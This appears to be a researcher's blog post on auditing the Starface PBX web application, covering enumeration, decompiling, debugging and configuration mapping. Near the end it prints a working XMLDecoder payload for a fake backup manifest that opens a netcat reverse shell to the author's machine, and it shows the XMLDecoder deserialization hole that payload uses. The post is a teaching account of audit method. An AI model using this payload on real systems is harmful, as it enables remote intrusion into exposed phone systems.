---
layout: post
title:  "Security Code Audit - For Fun and Fails"
date:   2022-05-24 23:00:09 +0200
categories: vulns4free
---
Recently, I asked the Twitter community if anyone would be interested in a blog post about "failed" security code audit attempts.
A lot of you seemed to like this idea, so here it is. I was somehow afraid to make a fool out of myself with this blog post
but sometimes it seems that everybody thinks that security code audits are kind of "rocket science".
Usually it goes like this: the professionals choose some high-value target and achieving Pre-Auth Remote Code Executions (RCE) should be the golden standard. And also
a professional doesn't fail and it wouldn't take weeks or months to find some critical vulnerabilities: IMHO, all of this belongs in dreamland.

So I try to give you a feeling how hard and frustrating it can be to audit a previously unknown product (without forgetting about the fun part!). Since my latest Pre-Auth RCE achievement
was a PBX product named *3CX* (see my [blog post](https://medium.com/@frycos/pwning-3cx-phone-management-backends-from-the-internet-d0096339dd88)),
I randomly chose another PBX product: **Starface Comfortphoning**. One can find tons of instances exposing the web interface to the public internet. Simply
have a look at [Censys.io](https://censys.io/) for example.

This blog post not only should give you some insight into my methods but also (my personal) common failures. Also keep in mind that **I didn't fully
audit the product yet, not at all**. I might have looked at 10% max. The code base is just huge and there are several services besides the web interface running on such an instance.
Thus, maybe after reading this blog post the one or the other will take some of my notes and find a nice vulnerability: I'm definitely still missing a lot of stuff
which is of course fine. Also this is **private time** and not related to any of my assessments at work or something similar. But let's begin.

# Setup

First, I looked at the [vendor's homepage](https://www.starface.com/) and read a lot of stuff like knowledge bases, support tickets, wikis etc.
If I'm lucky, a trial version can be downloaded without talking to some sales guy waiting for recalls. In the [Starface Wiki](https://knowledge.starface.de/pages/viewpage.action?pageId=46564694) I got the opportunity to download a full version of the latest release.
I chose **STARFACE VM-Edition / Version 7.2.0.5** because virtual machine images usually come with a complete preinstallation and I can also
control most of the environment, especially networking/firewalling.

They even provided a nice [documentation](https://knowledge.starface.de/display/SWD/Erstkonfiguration+der+STARFACE) for the initial setup, i.e.
how to configure your instance properly. After a short installation routine, we were greeted with login web interface.

![Login mask](/assets/images/auditfails/loginmask.png)

An initial administrator account was created through the installation routine as well: *Mr. Admin Istrator* with credentials `0001:adminadmin`.
Also an SSH service was provided, so I could easily get a proper shell as `root` and changed the default password to `adminadmin` as well.

# Enumeration within SSH session

This was a pretty comfortable situation, having access as root user via SSH. All I needed for the first round of enumeration.
I always start with the basics, i.e. enumeration of *processes* and *network connections*. Starting with process enumeration, I try to look
at *unusual stuff*, pretty much everything standing out from common (in this case) Linux processes.

```bash
[root@localhost ~]# ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
[...]
root        1176  0.0  0.3  92320  6160 ?        Ss   22:14   0:00 /usr/sbin/sshd -D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128-cbc -oMACs=hmac-sha2-256-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha1,umac-128@openssh.com,hmac-sha2-512 -oGSSAPIKexAlgorithms=gss-curve25519-sha256-,gss-nistp256-sha256-,gss-group14-sha256-,gss-group16-sha512-,gss-gex-sha1-,gss-group14-sha1- -oKexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1 -oHostKeyAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oPubkeyAcceptedKeyTypes=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oCASignatureAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519,rsa-sha2-256,rsa-sha2-512,ssh-rsa
[...]
tomcat      1696  2.5 40.0 4757928 810260 ?      Sl   22:14   0:57 /usr/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dderby.stream.error.file=/dev/null -Xmx988M -XX:MaxDirectMemorySize=64M -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/home/starface/tomcat-jmv-dump.hprof -Dderby.storage.pageCacheSize=200 -XX:+UseParallelGC -Dorg.apache.catalina.connector.CoyoteAdapter.ALLOW_BACKSLASH=true -Dorg.apache.tomcat.util.buf.UDecoder.ALLOW_ENCODED_SLASH=true -Dorg.apache.tomcat.util.http.Parameters.MAX_COUNT=10000 -Djdk.tls.ephemeralDHKeySize=4096 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0002 -agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start
root        1697  0.0  0.1  26244  3176 tty1     Ss+  22:14   0:00 /bin/bash /usr/sbin/adminshell.sh
root        1722  0.4  9.5 3791908 193660 ?      Sl   22:14   0:10 java -jar /var/lib/watchdog/watchdog.jar
[...]
daemon      2861  0.6 16.0 4026156 324672 ?      Sl   22:15   0:14 /usr/lib/jvm/java/bin/java -Djdk.tls.ephemeralDHKeySize=4096 -DopenfireHome=/opt/openfire -Dopenfire.lib.dir=/opt/openfire/lib -classpath /opt/openfire/lib/startup.jar -jar /opt/openfire/lib/startup.jar
[...]
```

So one could observe strange SSH daemon command line parameters, an `adminshell.sh` and of course all these **Java processes**.
Being mainly interested in the code audit parts, let's change the directory to the presumably correct web app deployment: `/opt/tomcat/webapps/localhost/starface/`. If you're not familiar with something of the technology stack you're looking at during enumeration (or code audit) phase(s), always try to Google the hell out of it. Reading documentation not only gives you expert knowledge on a technology but also could lead to some hints for (new) exploitation primitives later on.

Since we're dealing with a Java application, one could start to search for JSP

```bash
[root@localhost starface] find . -iname '*.jsp' # not really successful in this case
```

or XML files

```bash
[root@localhost starface] find . -iname '*.xml'
[...]
./WEB-INF/classes/struts.xml
./WEB-INF/classes/struts2-admin-interconnect.xml
./WEB-INF/classes/struts2-admin-moh.xml
./WEB-INF/classes/struts2-admin-phone.xml
./WEB-INF/classes/struts2-admin-security.xml
./WEB-INF/classes/struts2-module-designer.xml
./WEB-INF/classes/struts2-module-manager.xml
[...]
./WEB-INF/xml/authfilter_config.xml
[...]
./WEB-INF/struts-config.xml
[...]
./WEB-INF/web.xml # this is what you want later
[...]
```

Again, I like to mark all file locations which somehow stand out from the "noisy" stuff such as resource bundle files containing UI messages for different languages for example. I guess most of you are already familiar with the `WEB-INF/web.xml` file, the web descriptor file with all kind of interesting declarations like *URL paths, Java Servlets, Java Filters, security constraints* and much more. We will look at this later.

Also do not forget to look at the running network services: which services are listening on which ports? Are those services accessible from "outside", i.e.
not listening only on loopback interfaces? Is there a firewall in place?

```bash
[root@localhost starface]# netstat -antp | grep LISTEN
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      1696/java           
tcp        0      0 0.0.0.0:5060            0.0.0.0:*               LISTEN      1621/asterisk       
tcp        0      0 0.0.0.0:5061            0.0.0.0:*               LISTEN      1621/asterisk       
tcp        0      0 127.0.0.1:5038          0.0.0.0:*               LISTEN      1621/asterisk       
tcp        0      0 0.0.0.0:4559            0.0.0.0:*               LISTEN      1258/hfaxd          
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1176/sshd           
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      1205/postmaster     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      2063/master         
tcp6       0      0 :::50080                :::*                    LISTEN      1696/java           
tcp6       0      0 :::50081                :::*                    LISTEN      1696/java           
tcp6       0      0 127.0.0.1:9090          :::*                    LISTEN      2861/java           
tcp6       0      0 127.0.0.1:9091          :::*                    LISTEN      2861/java           
tcp6       0      0 :::5222                 :::*                    LISTEN      2861/java           
tcp6       0      0 :::5223                 :::*                    LISTEN      2861/java           
tcp6       0      0 :::5229                 :::*                    LISTEN      2861/java           
tcp6       0      0 :::8080                 :::*                    LISTEN      1696/java           
tcp6       0      0 127.0.0.1:8977          :::*                    LISTEN      1696/java           
tcp6       0      0 :::5269                 :::*                    LISTEN      2861/java           
tcp6       0      0 :::8181                 :::*                    LISTEN      1696/java           
tcp6       0      0 :::22                   :::*                    LISTEN      1176/sshd           
tcp6       0      0 :::3000                 :::*                    LISTEN      1696/java           
tcp6       0      0 ::1:5432                :::*                    LISTEN      1205/postmaster     
tcp6       0      0 ::1:25                  :::*                    LISTEN      2063/master         
tcp6       0      0 :::3002                 :::*                    LISTEN      1696/java
```

It's easy to write all this stuff in a few minutes for this blog post but believe me: I usually spend a large amount of time
for these enumeration steps. And **everything is written down in great detail** into my notes, preferably markdown.

Also, I like to search through log files such as `/opt/tomcat/logs/catalina.out`. This revealed a nice banner providing more valuable information such as the Java version. 

```
####### STARFACE version 7.1.1.7 started in 50558ms. #######
  Current Java version is: 1.8.0_292
  JVM: OpenJDK 64-Bit Server VM (25.292-b10, mixed mode)
  Running on: 4x amd64 Processor(s)
  RAM available for JVM: 878 MB
  Free hard disk space: 23 GB
  HardwareId: 206f990abfa7126be1b54bcd082f7879be3677fa
####### ############################################ #######
```

Why is this important? Sometimes several Java versions are installed on the same system but you want to make sure which one is used for the process you're looking at right now.

# Setup Code Audit Toolset

Before we talk about some tools I use during (Java) security code audits, what do we need? Well yes, the code.
With some proper `find` commands, one can easily search for all relevant files: usually `*.class` and `*.jar`. You might include of course `*.jsp` etc.
if applicable. But since you did proper file system enumeration before, it is already known to you where the code is located.

My approach usually goes like this: `find . -iname '*.jar' -exec cp {} ALL_JARS \;`, i.e. all class and JAR files are copied to new directories I create in advance.
Then there is a beautiful little [Python script](https://github.com/mogwailabs/jarjarbigs) by *Mogwai Labs*. This script recursively goes through the input directory and in the end creates one "huge" JAR file for you. It can process JAR and class files as well.

Now we got one or more JAR files and as you might know, Java bytecode is reversible which is great from an auditors perspective.
There are quite some Java decompilers out there, here are my current recommendations:

* [JD-GUI](https://java-decompiler.github.io/)
* [CFR](https://www.benf.org/other/cfr/)
* [Procyon](https://github.com/mstrobel/procyon)

There are even tools which provide different decompilers in one application such as [Bytecode Viewer](https://github.com/Konloch/bytecode-viewer) which is great for a "quick overview" but I usually stick to the toolset above. And one definitely should use **different Java decompilers** because each one of them comes with strengths and weaknesses. The most obvious weakness you might spot: one or more Java classes couldn't be decompiled by one decompiler but the others could.
One decompiler has problems with reversing `switch` statements, the other might not be capable of extracting nested anonymous classes etc. pp.

Alright, now all is setup for decompiling the huge JAR(s) we built with `jarjarbigs`. I won't list all command line parameters for each decompiler so simply read the CLI manual or documentation. Now you're ready to open the source files with the editor of your choice **but** we want to **debug all the things** as well.

So we fetch the **Eclipse IDE** from [here](https://www.eclipse.org/downloads/packages/). I usually prefer the **Eclipse IDE for Enterprise Java and Web Developers** edition but **Eclipse IDE for Java Developers** might be sufficient for most cases.
The **JD-GUI** project also provides an [Eclipse plugin](https://github.com/java-decompiler/jd-eclipse/releases/download/v2.0.0/jd-eclipse-2.0.0.zip)
which can be easily installed using the Eclipse menu path `Help -> Install new Software`. Also do not forget to set the **file associations** for *class without source* etc. to the new plugin. Otherwise, Java classes won't be decompiled in the editor mode automatically.

You can check your configuration by opening a random Java type (e.g. `de.vertico.starface.db.container.UpdateContainer`) and what you should see is this.

![Sample Java Class](/assets/images/auditfails/samplejavaclass.png)

During our SSH session enumeration we of course checked if there was some kind of debugging service running already which was not. So how to setup a debug interface? What we need is a **JDWP** (Java Debug Wire Protocol) interface our Eclipse instance could talk to. Reading some Tomcat documentation one quickly finds a way to do this. We created a new file at `/opt/tomcat/bin` with the following content:

```bash
export CATALINA_OPTS="$CATALINA_OPTS -agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n"
```

After restarting the virtual machine we tried to connect to the IP address `192.168.2.103` on port `8000` and....got nothing. This should have worked because there was no NATing in place or so. The virtual network interface was in *bridge mode* so we should have been able to talk to it. Several solutions existed but I usually chose the laziest: **SSH port forwarding**. 

```bash
ssh -L 8000:127.0.0.1:8000 root@192.168.2.103 -f -N
```

Now everything should have been setup to live debug the Java code. A few steps were missing though:

1. Create a new empty Java project.
2. Add the JAR file(s) baked with `jarjarbigs` to your project as **external JAR dependencies**.
3. Create a remote debug configuration and run it.

The two steps in 3. should give you something like this.

![Create Debug Configuration](/assets/images/auditfails/debugconfiguration.png)

![Start Debugging](/assets/images/auditfails/debugrunning.png)

We almost had all we needed to start the audit:

* Running virtual machine of the vendor.
* SSH access to the virtual machine with root privileges.
* Decompiled Java code.
* A working debugging environment in Eclipse.

# Application Mapping

Before looking at any code, I take some time to learn about the web interface first. Starting up **BurpSuite**, login, click every button, fill every field and take notes about everything you observe in the UI in combination with requests going through your MitM proxy of your choice.

We take the same mindset as we explained above during the SSH session enumeration part: try to spot **interesting** things but also **uninteresting** ones. "Uninteresting" could be e.g. "loading of JavaScript files". 

![Uninteresting Request](/assets/images/auditfails/uninterestingrequest.png)

And "interesting" example could be a request processing interesting parameters.

![Interesting Request](/assets/images/auditfails/interestingrequest.png)

Take notes about absolutely everything, even though you might think that it's only *of little interest at the moment*. Often I revisit my notes from top to down from time to time during my review process and then "rediscover" things, get new ideas for chains whatsoever. Here are some examples:

* `http://192.168.2.103/start.jsp` -> we expect JSP handlers (strange, we didn't find any JSP files, remember?)
* `http://192.168.2.103/login` -> POST request with parameters named `forward` and `secret (0002:f3abb3a69bee79[...])` -> containing our user ID `0002` and some kind of hash
* `http://192.168.2.103/frontend/calllist/display.do` -> `.do` or `.action` might be good indicators for **Struts** being used

# web.xml

After collecting tons of requests, understanding a bit of business logic, use cases etc. of the targeted product, we tried to understand how requests are mapped to code. In Java applications the `web.xml` usually reveals a ton of information. Of course this also depends on the frameworks used etc. which could make the content of this file minimal.

In our case, the `web.xml` contained **6651** lines of content...**six thousand six hundred and fifty one**. That's a looooot. So how did I approach this in the first place? Take your time to at least scroll slowly through the whole file because not every web descriptor file uses the same attributes, declarations etc. Try to use the principle of **Divide and Conquer** to extract abstract categories easier to handle by your brain in the beginning. This *could* look like this but I guess is pretty subjective.

First, I realized Starface had a large number of *Java Filters*.

```xml
[...]
	<filter>
		<filter-name>i18nFilter</filter-name>
		<filter-class>de.vertico.starface.filters.i18nFilter</filter-class>
	</filter>
	<filter>
		<filter-name>PhoneMenuAuthFilter</filter-name>
		<filter-class>de.vertico.starface.filters.PhoneAuthFilter</filter-class>
		<init-param>
			<param-name>scope</param-name>
			<param-value>PhoneMenu</param-value>
		</init-param>
		<init-param>
			<param-name>default-port</param-name>
			<param-value>50080</param-value>
		</init-param>
		<init-param>
			<param-name>secure-port</param-name>
			<param-value>50081</param-value>
		</init-param>
	</filter>
[...]
```

Next, there were several extra configuration files included/referenced.

```xml
[...]
	<context-param>
		<param-name>configfile</param-name>
		<param-value>/WEB-INF/starface-config.xml</param-value>
	</context-param>
	<context-param>
		<param-name>authFilterConfig</param-name>
		<param-value>/WEB-INF/xml/authfilter_config.xml</param-value>
	</context-param>
[...]
```

Then I saw the first `<url-pattern>` matchers, here linking ?Struts? action URLs to Java Filters.

```xml
[...]
	<!-- .action filter mappings -->
	<filter-mapping>
		<filter-name>ExceptionFilter</filter-name>
		<url-pattern>*.action</url-pattern>
		<dispatcher>REQUEST</dispatcher>
	</filter-mapping>
	<filter-mapping>
		<filter-name>PortFilter</filter-name>
		<url-pattern>*.action</url-pattern>
		<dispatcher>REQUEST</dispatcher>
	</filter-mapping>
[...]
```

You could also map Java Filters with Java Servlets.

```xml
[...]
	<!-- REST filter mappings -->
	<filter-mapping>
		<filter-name>PortFilter</filter-name>
		<servlet-name>REST</servlet-name>
	</filter-mapping>
	<filter-mapping>
		<filter-name>AntiXssFilter</filter-name>
		<servlet-name>REST</servlet-name>
	</filter-mapping>
```

We also noted the first time some kind of "security awareness" from the programmer's perspective by spotting the keyword `AntiXssFilter`.

There were a few more combinations but I won't list all of them.
If you're familiar with manual `web.xml` parsing and might already think about **Pre-Auth endpoints** then try to find declarations with `<security-constraint>`: you won't for Starface! It seemed that they used some kind of custom `AuthFilter` instead. Such kind of Java Filter was applied at all kinds of URL patterns e.g. for all `.do` URLs.

```xml
[...]
	<filter>
		<filter-name>AuthFilter</filter-name>
		<filter-class>de.vertico.starface.filters.AuthFilter</filter-class>
	</filter>
[...]
	<filter-mapping>
		<filter-name>AuthFilter</filter-name>
		<url-pattern>*.do</url-pattern>
	</filter-mapping>
[...]
```

Alright, let's recap: most of the `web.xml` contained Java Filter declarations. This was fine since Java Filters are implemented in Java code as Java Servlets are as well. From a programmatic perspective, they only differ (that's a *very rough differentiator!*) in the method name being called during request processing.

* Java Filters: `doFilter`
* Java Servlets: `doGet, doPost, service`

As I understood it, Java Filter order in the descriptor file is usually preserved for the request processing part. What does this mean? Let's make an example.

```xml
[...]
	<filter-mapping>
		<filter-name>CharacterEncodingFilter</filter-name>
		<url-pattern>/*</url-pattern>
	</filter-mapping>
	<filter-mapping>
		<filter-name>FailedRequestFilter</filter-name>
		<url-pattern>/*</url-pattern>
	</filter-mapping>
[...]
```

These two filters should be triggered by basically every incoming request. If I'm unable to Google specific questions, I simply test it empirically. Since we had the debugging environment running already, a test was easy.

1. Set a breakpoint at `de.vertico.starface.filters.CharacterEncodingFilter.doFilter(ServletRequest, ServletResponse, FilterChain)`.
2. Set a breakpoint at `de.vertico.starface.filters.FailedRequestFilter.doFilter(ServletRequest, ServletResponse, FilterChain)`.
3. Browse to `http://192.168.2.103/IDefinitelyDontCare`.

![Character Encoding Filter](/assets/images/auditfails/characterencodingfilter.png)

![Failed Request Filter](/assets/images/auditfails/failedrequestfilter.png)

It seemed this was a correct assumption. Why did we care? Because if a Java Filter contained a vulnerability before any *authentication check* could step in (remember the `AuthFilter`?), this would have led to a *Pre-Auth condition*. So we could have built a graph of URL patterns and Java Filter orders to obtain a list of Java Filters called before authentication checks would have been triggered.

Additionally, we spotted a file inclusion of `WEB-INF/xml/authfilter_config.xml` in the `web.xml` with the following content.

```xml
<properties>
	<category name="general">
	<!-- 
		Hier werden Pfade aufgelistet die keine Authorisierung brauchen
		und vom AuthFilter ignoriert werden
		(translated by me)
		This is a list of paths which do not need any authorization and
		are therefore ignored bei AuthFilter
		(/translated by me)
	 -->
		<property name="/ajax/restore" value="true" />
		<property name="/ajax/update" value="true" />
		<property name="/blank.html" value="true" />
		<property name="/index.jsp" value="true" />
		<property name="/jsp/blank.html" value="true" />
		<property name="/login.jsp" value="true" />
	</category>
</properties>
```

These were additional candidates to check for Pre-Auth flaws.

What about endpoints which were not handled by this `AuthFilter`? We found another authentication check filter in `web.xml`

```xml
		<filter-name>RestAuthFilterA</filter-name>
		<filter-class>de.starface.rest.authentication.RestAuthFilter</filter-class>
```

which might be handling URLs of another **REST** interface.

```xml
	<servlet-mapping>
		<servlet-name>REST</servlet-name>
		<url-pattern>/rest/*</url-pattern>
	</servlet-mapping>
```

Finding another Filter/Servlet mapping confirmed our assumption.

```xml
	<filter-mapping>
		<filter-name>RestAuthFilterA</filter-name>
		<servlet-name>REST</servlet-name>
	</filter-mapping>
```

The Java Servlet definition was found quickly.

```
	<servlet>
		<servlet-name>REST</servlet-name>
		<servlet-class>com.sun.jersey.spi.spring.container.servlet.SpringServlet</servlet-class>
		<init-param>
			<param-name>com.sun.jersey.config.property.packages</param-name>
			<param-value>
				io.swagger.jaxrs.json;
				io.swagger.jaxrs.listing;
				de.starface.middleware;
				de.starface.persistence.jpa;
				de.starface.rest;
				de.starface.rest.common;
				de.starface.rest.controller;
				de.starface.rest.addressbook.api;
				de.starface.rest.redirects.api;
				de.starface.rest.fmcPhones.api
				de.starface.rest.functionkeys.api;
				de.starface.rest.users.api;
		[...]
```

So we should take a look at the namespace `de.starface.rest` to get an idea of how the **Spring REST** interfaces were implemented. The **namespace structure** often gives good hints about how the programmers organized their code: another important step to make your code auditing process more efficient.

![REST Namespace Structure](/assets/images/auditfails/restnamespacestructure.png)

Let's have a look how the request handling was done for the Spring interfaces in e.g. `de.starface.rest.controller.AccountsApi`.

![REST Accounts List](/assets/images/auditfails/restgetaccountslist.png)

What makes this kind of request handling easily readable (and discoverable!) were **Annotations** like `@Path, @Consumes, @Produces, ...`, distinguishable from the Java Servlet request handlers we described above. This is why learning about the frameworks being used is important to not miss any request handlers right at the beginning.

To verify my current state of knowledge, I always tend to make checks from time to time in the debugger. Let's stick to the `de.starface.rest.controller.AccountsApi` use-case. We did a GET request to the following URL `http://192.168.2.103/rest/accounts/` from an *unauthenticated* context and...hit the breakpoint.

![REST Breakpoint Hit](/assets/images/auditfails/restbreakpointhit.png)

That was somehow unexpected because I rather expected that my request would be sorted out by the `RestAuthFilterA` in advance. My assumption failed but that was fine because I could hit endpoints without prior authentication obviously. What did I see in BurpSuite then?

```
HTTP/1.1 401 
[...]

{"code":"d937bb0c-ab0f-464a-a02a-41840746a45a","message":"Not logged in"}
```

But why? The implementing class could be found in `de.starface.rest.accounts.api.impl.AccountsApiServiceImpl.getAccounts(HttpServletRequest)`:

```java
/*    */   public Response getAccounts(HttpServletRequest request) throws RestException {
/* 30 */     AuthHelper.getAndCheckPrincipal(request);
/* 31 */     CATConnectorPGSQL catConnectorPgsql = (CATConnectorPGSQL)StarfaceComponentProvider.getInstance().fetch(CATConnectorPGSQL.class);
/*    */     
/* 33 */     return RestResponse.returnSuccessfulWithData(AccountsFactory.createAccounts(catConnectorPgsql
/* 34 */           .getAccount2ParamsMapIdAndName(), new HashSet()));
/*    */   }
```

And we found another authentication check variant with `AuthHelper.getAndCheckPrincipal(request)`. And here it is.

```java
/*    */   public static Principal getAndCheckPrincipal(HttpServletRequest request) throws RestException {
/*    */     Principal principal;
/* 27 */     Object principalAttribute = request.getAttribute("principal");
/*    */     
/* 29 */     if (principalAttribute instanceof Principal) {
/* 30 */       principal = (Principal)principalAttribute;
/*    */     } else {
/* 32 */       throw new BadRequestException("46dca6f5-ed1a-44c9-920d-b0e57ea17ef5", "Invalid Rest-Request: Missing Authentication");
/*    */     } 
/*    */     
/* 35 */     if (principal.isGuest()) {
/* 36 */       throw new UnauthorizedException("d937bb0c-ab0f-464a-a02a-41840746a45a", "Not logged in");
```

One could easily recognize that the `UnauthorizedException` was an exact match with our HTTP response from the server. So it seemed obvious to check **all controller classes** in this namespace for

1. the existence of the `AuthHelper.getAndCheckPrincipal(request)` call
2. if the call was there, if some processing on the attacker-controlled `HttpServletRequest` was done before

*Step 2* was another lessons learned because the existence of an authentication check does **not** mean that maybe one couldn't do something bad before this check would have been called. Unfortunately, after looking at *all controller classes* I did not spot any obvious flaws.

Did we have a good understanding about all request source handling already? No, only `web.xml` based Java Servlet and Filter request handling and Spring framework annotated ones so far. 

# struts-config.xml

In the `web.xml` some URL pattern definitions for `.action` and `.do` brought us to the conclusion that **Struts** might be in use. We should have a look at `struts.xml` and `struts-config.xml` for this which I did.

Another framework, another configuration scheme, other things to look at and understand. That's the exhausting part of code audits and this is also why audits might last several days, weeks or even months before one at least understands all the "inner workings" of a product.

Let's take an example from the `struts-config.xml` file.

```xml
[...]
        <action path="/config/backup/importBackup"
            type="de.vertico.starface.config.server.actions.BackupImportAction"
            name="importBackupForm" validate="false"
            parameter="requiredPermission=administration;task=execute">
            <forward name="nextStep" path="/jsp/progress/backup-import.jsp"/>
        </action>
[...]
```

There was a *path*, *type* (our code!), and also some *parameters* which pointed to required permissions needed. You should enumerate again all *action paths* and understand the difference between permission types etc.
We'll stick to this specific path for a moment. Could I find the request trigger in the UI as well? I always jump between my debugging window, my decompiled source in VS code and my desktop with BurpSuite and browser open.

Since the permission requirement said *administration*, I logged in as administrator `0001`. After a bit of clicking around, I found the menu entry **Configuration**.

![Administration UI](/assets/images/auditfails/administrationUI.png)

The endpoint definition said `importBackup` which seemed to be a good match here.

![Administration UI](/assets/images/auditfails/backupUI.png)

We triggered a *Default Backup* to verify the suspected chain in the code (and also create a backup artifact). A POST request to `http://192.168.2.103/config/server/backup/execute.do` was observed. The backup was downloadable and named `backup-Default-1653253925922.sar`. What did the file content look like?

```bash
user:~/Downloads$ unzip -l backup-Default-1653253925922.sar
Archive:  backup-Default-1653253925922.sar
  Length      Date    Time    Name
---------  ---------- -----   ----
    12542  2022-05-22 23:12   db-entities/de.vertico.starface.db.v191.hibernate.CountryCode
[...]
     5167  2022-05-22 23:12   var-data/srtpcerts/asterisk.pem
     1465  2022-05-22 23:12   var-data/phonecerts/cert_rootca.der.new
     1358  2022-05-22 23:12   var-data/phonecerts/pubkey_cert.DER.new
     1465  2022-05-22 23:12   var-data/phonecerts/cert_rootca.der
     1358  2022-05-22 23:12   var-data/phonecerts/pubkey_cert.DER
  3821434  2022-05-22 23:12   music-on-hold2/starface-music.sln16
     3743  2022-05-22 23:12   db-entities/de.vertico.starface.db.SequenceValue
    17638  2022-05-22 23:12   manifest.xml
---------                     -------
  8270904                     417 files
```

*Backup restore functions* usually are excellently suited for getting **fast RCE**. We needed a success story after this unsuccessful trip for days. Also this could have been one part of a more interesting exploitation chain. Who knows?

Time to look at the class `de.vertico.starface.config.server.actions.BackupImportAction` and since this was based on Struts: `de.vertico.starface.config.server.actions.BackupImportAction.execute(ActionMapping, ActionForm)`.

First, the `org.apache.struts.action.ActionForm form` from the request was casted into a new variable `de.vertico.starface.config.server.forms.BackupImportForm importForm` which eventually landed here in the same `execute` method.

```java
[...]
/*  67 */       if (importForm.isImportUpload())
/*     */       {
/*  69 */         return prepareUploadFileTask(mapping, importForm);
/*     */       }
[...]
```

The next call went to `de.vertico.starface.config.server.actions.BackupImportAction.prepareUploadFileTask(ActionMapping, BackupImportForm)`. The `importForm` was then casted there into again a new variable `org.apache.struts.upload.FormFile importFile`. The upload content was then written into a `FileOutputStream out` with help of `org.apache.commons.io.IOUtils.copy(InputStream, OutputStream)`. A "temporary file" was created then and processing the uploaded content began with a call to

```java
[...]
/* 204 */       IManifestContainer container = ContainerResolver.getContainer(tmpFile);
[...]
```

The `getContainer` method simply returned the result of another method call `return new ZipManifestContainer(file)`.

The constructor of `de.vertico.starface.db.container.ZipManifestContainer.ZipManifestContainer(File)` finally contained a call to a `readManifest()` method.

```java
/*    */   private void readManifest() throws IOException {
/* 33 */     try (ZipFile zip = new ZipFile(getFile())) {
/* 34 */       entry = zip.getEntry("manifest.xml");
/* 35 */       if (entry == null) {
/* 36 */         throw new IOException("No manifest entry found");
/*    */       }
/* 38 */       InputStream in = zip.getInputStream(entry);
/* 39 */       XMLDecoder dec = new XMLDecoder(in);
/* 40 */       this.manifest = (Manifest)dec.readObject(); // <--- Ouch!!
/* 41 */       dec.close();
/* 42 */       in.close();
/*    */     } 
/*    */   }
```

And here we had found it: our **fast RCE**. `XmlDecoder.readObject` is a well-known "friend" for Java code auditors because it allows instant code execution without any restrictions to class paths or so as it is known for other unmarshalling/deserialization flaws.

Since `netcat` with `-e` option came preinstalled on the vendor's virtual machine, this was a quick win.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_292" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="5">
          <void index="0">
              <string>/usr/bin/nc</string>
          </void>
          <void index="1">
              <string>-e</string>
          </void>
          <void index="2">
              <string>/bin/sh</string>
          </void>
          <void index="3">
              <string>192.168.2.100</string> <!-- my attacker machine -->
          </void>
          <void index="4">
              <string>1337</string>
          </void>
      </array>
      </void>
 </object>
</java>
```

Honestly, when I was first browsing through the code to check for how the ZIP file content was processed, I rather thought about an XML External Entity (XXE) flaw but this was even better and a lot easier. Building a fake backup ZIP file with the malicious `manifest.xml` was quickly done and handed over to the restore function to prove the RCE.

# Unprivileged User Attack Surface

Until then, we failed in looking for **unauthenticated endpoints** being vulnerable for anything relevant. *Remark: I did explain above that one should map all the URL patterns against Java Servlets and Filters described in `web.xml` which to this date, I did not. There might be some unseen attack surface!*

But since this blog post is not about the latest and coolest new RCEs but rather giving a walk-through over my whole security audit process, we proceed with the next category: *Searching for vulnerable actions as unprivileged user*.

We begin with a biased trigger of my simple mind by the abbreviation **RPC** (Remote Procedure Call). This usually reminds me of a lot of vulnerabilities in the past. The `web.xml` indeed revealed something similar.

```xml
[...]
	<servlet-mapping>
		<servlet-name>XmlRpcServlet</servlet-name>
		<url-pattern>/xml-rpc</url-pattern>
	</servlet-mapping>
```

```xml
[...]
	<servlet>
		<servlet-name>XmlRpcServlet</servlet-name>
		<servlet-class>de.starface.com.rpc.xmlrpc.http.XmlRpcServlet</servlet-class>
